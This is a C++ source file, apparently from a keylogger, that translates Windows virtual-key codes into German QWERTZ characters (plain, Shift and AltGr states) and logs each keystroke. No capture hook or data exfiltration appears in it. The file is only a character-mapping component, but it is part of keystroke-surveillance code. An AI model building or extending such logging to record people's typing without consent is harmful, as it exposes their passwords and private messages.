#include "pch.h"
#include "keyscan.h"

#ifdef GERMAN_QWERTZ 
bool keyscan::functional(const int& keycode) {
	switch (keycode) {
	//functional keys
	case VK_RETURN:
		LOG(L"[return/enter]");
		return true;
	case VK_BACK:
		LOG(L"[backspace]");
		return true;
	case VK_SHIFT:
		return true;
	case VK_MENU:
		return true;
	default: return false;
	}
}

void keyscan::mless(const int& keycode) {
	switch (keycode) {
	//special characters
	case VK_OEM_1:
		LOG(L'ü'); break;
	case VK_OEM_2:
		LOG(L'#'); break;
	case VK_OEM_3:
		LOG(L'ö'); break;
	case VK_OEM_4:
		LOG(L'ß'); break;
	case VK_OEM_5:
		LOG(L'^'); break;
	case VK_OEM_6:
		LOG(L'´'); break;
	case VK_OEM_7:
		LOG(L'ä'); break;
	case VK_OEM_PERIOD:
		LOG(L'.'); break;
	case VK_OEM_MINUS:
		LOG(L'-'); break;
	case VK_OEM_COMMA:
		LOG(L','); break;
	case VK_OEM_PLUS:
		LOG(L'+'); break;
	case VK_OEM_102:
		LOG(L'<'); break;
	}
	//simple alphabet
	if (keycode > 64 && keycode < 91)
		LOG(wchar_t(keycode + 32));
	//numbers
	if (keycode > 47 && keycode < 58)
		LOG(wchar_t(keycode));
}

void keyscan::shift(const int& keycode) {
	switch (keycode) {
	//number keys
	case 0x30:
		LOG(L'='); break;
	case 0x31:
		LOG(L'!'); break;
	case 0x32:
		LOG(L'\"'); break;
	case 0x33:
		LOG(L'§'); break;
	case 0x34:
		LOG(L'$'); break;
	case 0x35:
		LOG(L'%'); break;
	case 0x36:
		LOG(L'&'); break;
	case 0x37:
		LOG(L'/'); break;
	case 0x38:
		LOG(L'('); break;
	case 0x39:
		LOG(L')'); break;
	//special characters
	case VK_OEM_1:
		LOG(L'Ü'); break;
	case VK_OEM_2:
		LOG(L'\''); break;
	case VK_OEM_3:
		LOG(L'Ö'); break;
	case VK_OEM_4:
		LOG(L'?'); break;
	case VK_OEM_5:
		LOG(L'°'); break;
	case VK_OEM_6:
		LOG(L'`'); break;
	case VK_OEM_7:
		LOG(L'Ä'); break;
	case VK_OEM_PERIOD:
		LOG(L':'); break;
	case VK_OEM_MINUS:
		LOG(L'_'); break;
	case VK_OEM_COMMA:
		LOG(L';'); break;
	case VK_OEM_PLUS:
		LOG(L'*'); break;
	case VK_OEM_102:
		LOG(L'>'); break;
	}
	//simple alphabet
	if (keycode > 64 && keycode < 91)
		LOG(wchar_t(keycode));
}

void keyscan::altgr(const int& keycode) {
	switch (keycode) {
	//special german-specific functions for "q" and "e" keys
	case 69:
		LOG(L'€'); break;
	case 81:
		LOG(L'@'); break;
	case 0x30:
		LOG(L'}'); break;
	case 0x32:
		LOG(L'²'); break;
	case 0x33:
		LOG(L'³'); break;
	case 0x37:
		LOG(L'{'); break;
	case 0x38:
		LOG(L'['); break;
	case 0x39:
		LOG(L']'); break;
	case VK_OEM_4:
		LOG(L'\\'); break;
	case VK_OEM_PLUS:
		LOG(L'~'); break;
	case VK_OEM_102:
		LOG(L'|'); break;
	}
}
#endif